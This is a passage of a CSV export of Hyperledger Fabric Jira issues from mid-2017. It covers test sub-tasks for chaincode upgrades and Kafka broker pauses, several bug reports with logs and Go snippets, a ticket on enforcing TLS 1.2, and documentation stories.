command. The values should be reset without having to restart the Orderer.",,hancockp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FAB-12265,,FAB-4832,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4jj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,hancockp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
upgrade chaincode using CLI commands,FAB-4837,18250,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,17/Jun/17 2:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4837-upgrade chaincode on a channel
 * *Component*: Endorser
 * *Description*: Use CLI container, to upgrade a chaincode from version 1.0 to version 2.0 with an added functionality to the chaincode and perform invoke and query
 * *Artifact Locations*: crypto-config/
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: CLI
 * *Input*: ./script.sh in cli container
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4jr:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
downgrade chaincode (upgrade to previous version) should be rejected cleanly,FAB-4838,18251,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,17/Jun/17 2:59 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4838-downgrade chaincode on a channel
 * *Component*: Endorser
 * *Description*: Use CLI container, to downgrade a chaincode from version 2.0 to version 1.0 and perform invoke and query
 * *Artifact Locations*: crypto-config/
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: CLI
 * *Input*: ./script.sh in cli container
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4jz:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[Servicibility issue] When transaction marked as Invalid , warning should include channel, chaincode, version and Reason code details",FAB-4842,18260,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,Ratnakar,Ratnakar,17/Jun/17 6:14 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 12:27 PM,v1.0.0-beta,,,v1.1.0,,fabric-ledger,,,,,,0,quality,,,,,,"Refer the testcase details -FAB-4662-

 

when transactions are marked as Invalid, for instance see the below logs
{code:java}
2017-06-16 20:18:19.491 UTC [statevalidator] ValidateAndPrepareBatch -> DEBU 8b4 Block [3] Transaction index [0] TxId [b1c5805af47ccabd1a75973e8b38523bbf549ad4ca0e1e344e5aaffce1035e5e] marked as valid by state validator
2017-06-16 20:18:19.491 UTC [statevalidator] ValidateAndPrepareBatch -> DEBU 8b8 Block [3] Transaction index [1] TxId [7d30e435cf099fc4f35e588d3aaed2c9c885b5121944a38fc565426f7342b7c7] marked as valid by state validator
2017-06-16 20:18:19.491 UTC [statevalidator] ValidateAndPrepareBatch -> WARN 8ba Block [3] Transaction index [2] TxId [3b8b6658ace5f30b02faa82a074de1acc58cded898843ea9538b26085ddb9dec] marked as invalid by state validator. Reason code [11]{code}
When transaction is Invalid, the warning log should contain the following details aswell
 * channel name
 * chaincode name
 * Version
 *  Reason code 11

 ---------------------------

In current 1.1 master, ledger logs tran invalidation in two places.

This one logs the txid and the reason code string:

core/ledger/kvledger/txmgmt/validator/statebasedval/state_based_validator.go:            logger.Warningf(""Block [%d] Transaction index [%d] TxId [%s] marked as invalid by state validator. Reason code [%s]"" ...

 This one should be improved to return the txid and reason code string rather than the reason code number:

core/ledger/kvledger/txmgmt/validator/valimpl/helper.go:            logger.Warningf(""Block [%d] Transaction index [%d] marked as invalid by committer. Reason code [%d]"" ...

 

The txid and reason code string will make it much easier to troubleshoot invalidations, in addition to the other fields mentioned above.",,ChristopherFerris,denyeart,mastersingh24,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,FAB-6476,,,,,,,,,,,,,,,,,,,,,"17/Jun/17 6:13 AM;Ratnakar;2017_06_16_16_43_26-logs.tar.gz;https://jira.hyperledger.org/secure/attachment/11196/2017_06_16_16_43_26-logs.tar.gz",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2f3:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,mastersingh24,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 3:15 PM;ChristopherFerris;this is not a bug but an improvement. reclassified and pushed to post 1.0;;;","06/Oct/17 1:12 PM;denyeart;Technically this is an improvement, but without it troubleshooting is almost unworkable therefore I'm ok tracking as a serviceability bug and prioritizing in 1.1.;;;","23/Nov/17 11:12 PM;mastersingh24;[~denyeart] I was going to add the channel to helper.go as well;;;","24/Nov/17 12:12 AM;mastersingh24;https://gerrit.hyperledger.org/r/15693;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Sequential pausing of kafka brokers(2min between pausing and unpausing) while sending traffic to 3 orderers, 4 kafka brokers on 1 channel",FAB-4843,18261,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,17/Jun/17 6:25 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4843-ORD105-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 500,000 Tx to 3 orderers on 1 channel with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause the first kafka broker, wait for 2 minutes, and then unpause it, wait for sometime, followed by other kafka brokers as well (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD105 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4l3:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pause ALL KafkaBrokers,FAB-4845,18263,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,17/Jun/17 6:51 AM,21/Dec/18 5:10 AM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4845-ORD106-sending txs to 3 orderers, 4 kafka brokers on 1 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 300,000 Tx to 3 orderers on 1 channels with 4 kafka brokers. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) Using a separate thread, pause all kafka brokers, wait for 30 seconds, unpause all kafka brokers  (3) Reconnect the broadcast clients to send the transactions and deliver clients to receive both before and after the orderer restarted
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD106 -timeout 50m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4lb:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SECURITY enforce that TLSv1.0 is not used,FAB-4848,18266,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,ales,ales,17/Jun/17 10:28 PM,29/Aug/18 4:20 PM,28/Oct/23 3:00 AM,19/Jun/17 4:45 AM,,,,v1.0.0,v1.0.0-rc1,fabric-crypto,fabric-peer,,,,,1,security,Security,,,,,"TLS version 1.0 is broken since years, there's a ton of literature showing why and how it's insecure. Unfortunately, fabric will accept to talk TLSv1.0, as shown here

{{// MinVersion contains the minimum SSL/TLS version that is acceptable.}}
{{// If zero, then TLS 1.0 is taken as the minimum.}}
{{MinVersion uint16}}

The fix should be that we set MinVersion to be TLSv1.2.

_FWIW: this is a stopship for most proprietary products._",,ales,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,";18/Jun/17 10:22 PM;mastersingh24;2700",,3600,900,2700,75%,3600,900,2700,Not a security issue,,,,,,,,,,,,,,,FABC-314,,,,FAB-11748,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4lr:",,,,,,,,,,,,,,,,,,,,,,,ales,ChristopherFerris,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jun/17 10:28 PM;ales;[~ellaki], [~elli-androulaki], [~angelo.decaro];;;","18/Jun/17 7:27 AM;ChristopherFerris;This was picked up in GoAST scan and should be fixed to enforce 1.2;;;","18/Jun/17 9:17 PM;mastersingh24;FWIW - gRPC will not work without TLS 1.2 in any case since it uses HTTP/2 and HTTP/2 requires ALPN support which is not part of TLS versions < 1.2;;;","18/Jun/17 9:19 PM;mastersingh24;I'll take this one - we are actually set up to be able to easily do this since we use a common gRPC server implementation and we also have our own custom server creds;;;","18/Jun/17 10:22 PM;mastersingh24;https://gerrit.hyperledger.org/r/10753;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create a basic Fabric network,FAB-4851,18269,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,18/Jun/17 10:43 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,21/Jun/17 8:59 PM,v1.0.0-beta,,,v1.0.0-rc1,,,,,,,,0,Documentation,,,,,,"one peer

one orderer

one msp

couchdb

all with default configuration that can be used by various sample apps and tutorials",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,7200,,0%,7200,7200,,Not a security issue,,,,,,,,FAB-4518,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4m7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jun/17 12:04 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/10743/;;;","20/Jun/17 11:30 AM;ChristopherFerris;[https://gerrit.hyperledger.org/r/#/c/10807/] - 10743 abandoned;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create separate repo for samples,FAB-4853,18271,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,18/Jun/17 5:42 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,21/Jun/17 8:58 PM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-docs,,,,,,8,Documentation,,,,,,"create a separate repository for fabric samples that are included in fabric-docs. 

 

Please see request here https://lists.hyperledger.org/pipermail/hyperledger-fabric/2017-June/001197.html",,baohua,ChristopherFerris,JonathanLevi,lehors,yahtoo,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,7200,7200,,Not a security issue,,,,,,,,FAB-4518,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4mf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,ChristopherFerris,JonathanLevi,lehors,yahtoo,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jun/17 6:57 PM;baohua;It's a good idea to separate those samples from the main code from my opinion.

But please do clarify clearly what those abbreviations mean in some place, as it's not easy to guess from the sub-dir names. Or maybe can use explicit names like `first-network`, `first-chaincode` or `first-app`.

Thanks!;;;","19/Jun/17 1:57 PM;lehors;I totally agree with Baohua on the names and will go further: those short names are a no-go for me. There is little to gain from them and a lot to lose. Just expand to something like:

fabric-samples/first-network

fabric-samples/first-chaincode

fabric-samples/first-app

Otherwise, as we all know, having a separate repo has its downsides but overall I think this makes sense. We need to make it easy for users to get these without pulling the whole fabric repo.;;;","20/Jun/17 6:57 AM;ChristopherFerris;can we please focus on the material question, we can worry about names later. ;;;","20/Jun/17 7:40 AM;JonathanLevi;Yes, now that we have worked so hard to ""lock"" the APIs, I agree we should have a separate repo for the code samples.

We may indeed end up with different names and possibly versions/revisions... but first things first: +1

Thank you Chris.;;;","20/Jun/17 8:03 AM;ChristopherFerris;Ok, this has 5 maintainers. I'll ask [~ryjones] to set up the repo with the same maintainer rules as fabric and will move over the sample apps.;;;","20/Jun/17 11:29 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/10803/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermitently failing test -- TestMsgStoreExpiration,FAB-4854,18280,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,19/Jun/17 1:15 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jun/17 10:30 AM,v1.0.0-alpha2,,,v1.0.0,,fabric-gossip,,,,,,0,gossip,,,,,,"From time to time {{TestMsgStoreExpiration}} appears to fail in CI due to timeout reached while waiting for peers to stabilize on membership view:

{code}
10:37:19 unit-tests_1  | 2017-06-18 10:37:04.171 UTC [gossip/discovery#localhost:2613] expireDeadMembers -> WARN 4e8 Closing connection to Endpoint: localhost:2614, InternalEndpoint: localhost:2614, PKI-ID: [108 111 99 97 108 104 111 115 116 58 50 54 49 52], Metadata: []
10:37:19 unit-tests_1  | 2017-06-18 10:37:04.172 UTC [gossip/discovery#localhost:2613] expireDeadMembers -> WARN 4e9 Closing connection to Endpoint: localhost:2615, InternalEndpoint: localhost:2615, PKI-ID: [108 111 99 97 108 104 111 115 116 58 50 54 49 53], Metadata: []
10:37:19 unit-tests_1  | 2017-06-18 10:37:04.172 UTC [gossip/discovery#localhost:2613] expireDeadMembers -> WARN 4ea Exiting
10:37:19 unit-tests_1  | --- FAIL: TestMsgStoreExpiration (37.80s)
10:37:19 unit-tests_1  | 	assertions.go:225: 
                        
	Error Trace:	discovery_test.go:1177
10:37:19 unit-tests_1  | 		
			discovery_test.go:1165
10:37:19 unit-tests_1  | 		
			discovery_test.go:1217
10:37:19 unit-tests_1  | 		
			discovery_test.go:848
10:37:19 unit-tests_1  | 		
	Error:		Timeout expired!
10:37:19 unit-tests_1  | 		
10:37:19 unit-tests_1  | 	assertions.go:225: 
                        
	Error Trace:	discovery_test.go:1177
10:37:19 unit-tests_1  | 		
			discovery_test.go:1165
10:37:19 unit-tests_1  | 		
			discovery_test.go:1217
10:37:19 unit-tests_1  | 		
			discovery_test.go:890
10:37:19 unit-tests_1  | 		
	Error:		Timeout expired!
10:37:19 unit-tests_1  | 		
10:37:19 unit-tests_1  | FAIL
10:37:19 unit-tests_1  | coverage: 83.9% of statements
10:37:19 unit-tests_1  | FAIL	github.com/hyperledger/fabric/gossip/discovery	38.252s
10:37:19 unit-tests_1  | error: exit status 1
10:37:19 unit-tests_1  | panic: EOF
10:37:19 unit-tests_1  | 
10:37:19 unit-tests_1  | goroutine 1 [running]:
10:37:19 unit-tests_1  | panic(0x4daca0, 0xc420064020)
10:37:19 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x1a1
10:37:19 unit-tests_1  | main.main()
10:37:19 unit-tests_1  | 	/opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x15fd
10:37:19 unittest_unit-tests_1 exited with code 2
10:37:19 Stopping couchdb ... 
{code}

https://jenkins.hyperledger.org/job/fabric-verify-x86_64/13569/console

Here is related code from the test:

{code}
	assertMembership(t, instances, nodeNum-1)

	waitUntilOrFailBlocking(t, instances[nodeNum-1].Stop)
	waitUntilOrFailBlocking(t, instances[nodeNum-2].Stop)

	assertMembership(t, instances[:len(instances)-2], nodeNum-3)
{code}

And {{assertMembership}} function which implemented following way:

{code}
func assertMembership(t *testing.T, instances []*gossipInstance, expectedNum int) {
	fullMembership := func() bool {
		for _, inst := range instances {
			if len(inst.GetMembership()) != expectedNum {
				return false
			}
		}
		return true
	}
	waitUntilOrFail(t, fullMembership)
}
{code}
",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy4mv:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Output meaninglfull error if MSP folder misconfired rather than panicing.,FAB-4855,18281,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,19/Jun/17 1:25 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jun/17 10:32 AM,v1.0.0-alpha2,,,v1.0.0,,fabric-peer,,,,,,0,peer,,,,,,"Currently if peer get incorrectly configured with missing MSP folder it simply panics instead of providing reason. It will be much better to handle this case and provide normal output, also no need to try to setup MSP if folder missing, hence suggesting to add check whenever folder exists or not.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4n3:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Node SDK docs should defer to Fabric docs for setting up fabric dev env,FAB-4858,18288,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,19/Jun/17 11:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jun/17 2:48 PM,v1.0.0-beta,,,DUPLICATE,,fabric-docs,,,,,,0,Documentation,,,,,,"Node SDK docs should defer to Fabric docs for setting up fabric dev env. For one, the links to the Fabric docs are obsolete, as the Getting Started is evolving to address different personas (app developer, network administrator, etc).

 

I think that the Node SDK developer should be able to leverage the basic network rather than the more complex environment that is oriented to network administrators.",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FABN-316,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4nj:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Calling Invoke Transaction in a loop continuously doesn't work,FAB-4862,18300,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,denyeart,subbu165,subbu165,19/Jun/17 4:24 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 12:08 AM,v1.0.0-alpha1,,,v1.0.0,,fabric-ledger,,,,,,0,v1.0,,,,,,"Calling Invoke Transaction in a loop continuously doesn't work.

We are using Fabric Alpha Images - x86_64-1.0.0-alpha.

Our topology is like One orderer (SOLO), 2 orgs with 2 peers each, similar to what we have in e2e Samples. We use LevelDB.

We are calling the Invoke Transaction from Node SDK continuously in a loop for the Bulk Data Load. We tried adding 7 records, the execution of all Txns went fine and we don't see any errors in any of the logs. But during retrieval some records were missing and not persisted. 

Our use case is as below:

In one Invoke we make couple of commits in the LevelDB. One for adding the actual entity/asset and the other for maintaining a reference/Index for similar records.

So lets say the 1st Invoke happened successfully and when the second record goes in which is similar to the 1st one, then we retrieve the existing reference record and update it and in the same flow we persist the asset too. These kind of records, though in the logs it says it persisted but we are not able to retrieve it at all from DB.

We can work around this problem if we put sleep time of 15 seconds in between every Invoke, everything happens successfully without any issues. Also we are making sure that when the 1st Invoke is committed to the ledger only then the next one is executed using the Callback mechanism/Promises.

 ",,denyeart,subbu165,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx4rb:",,,,,,Sprint 16  - Ledger,,,,,,,,,,,,,,,,,denyeart,subbu165,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jun/17 10:42 PM;denyeart;[~subbu165] Please reproduce on v1.0 beta release and attach peer log at debug level for ledger.  Highlight which key has been added but cannot be queried, as well as the corresponding tx ids.  We can start with this, but if feasible would also be good to have the zipped up ledger from the file system.;;;","20/Jun/17 12:55 AM;subbu165;Hi David, Sure. I will Move to Beta and try to reproduce the issue. If its still exist I will attach the required Info as you mentioned above.;;;","21/Jun/17 12:08 AM;denyeart;Discussed issue with [~subbu165].  It turns out their application was trying to update the same record across two different transactions, in quick succession.  Given the fabric transaction model, this approach will introduce failures. If the 2nd transaction attempts to query the record, it will likely not be committed to peer yet and will not be found.  The application cannot assume that transactions are committed the moment they are submitted to ordering.

The recommendation in this case would be to update the application to be aligned with the fabric transaction model.  For example instead of updating the same record across two different transactions, have each transaction update their own record.  Composite keys can be used where the first part of the composite key would be the same across the two transactions, and the second part of the composite key would be unique.  Then it is possible to later query based on the first part of the composite key and get back the two similar records.

[~subbu165] see [https://github.com/hyperledger/fabric/blob/master/core/chaincode/shim/interfaces.go] and look for APIs such as CreateCompositeKey(), GetStateByPartialCompositeKey(), and SplitCompositeKey().;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix broken doc links in fabric-sdk-py,FAB-4863,18304,14052,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,qiang0723,qiang0723,qiang0723,19/Jun/17 8:47 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 12:56 PM,,,,,,,,,,,,0,,,,,,,"""More information, please see the project [wiki](wiki.hyperledger.org/projects/fabric-sdk-py.md)""

this link seems broken. it should be ""https://wiki.hyperledger.org/projects/fabric-sdk-py""

And I will check the other links as well.",,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy4pb:",,,,,,Sprint 4,,,,,,,,,,,,,,,,,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jun/17 4:43 PM;qiang0723;[https://gerrit.hyperledger.org/r/#/c/10895/]

But the link doesn't work yet, missing ""https://"" .  I will fix it in next task;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add tracing of individual broadcast/deliver messages,FAB-4866,18330,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,20/Jun/17 12:42 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,05/Aug/17 6:43 AM,v1.0.0-beta,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,Release-planning-1.1,,,,,"For hard to debug problems, actually having access to the bytes of a message can be the only definitive way to diagnose.  Although clearly not intended for most production scenarios, the ability to log individual requests as they arrive would greatly enhance the serviceability of the orderer.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy4rb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 1:10 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/10781/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
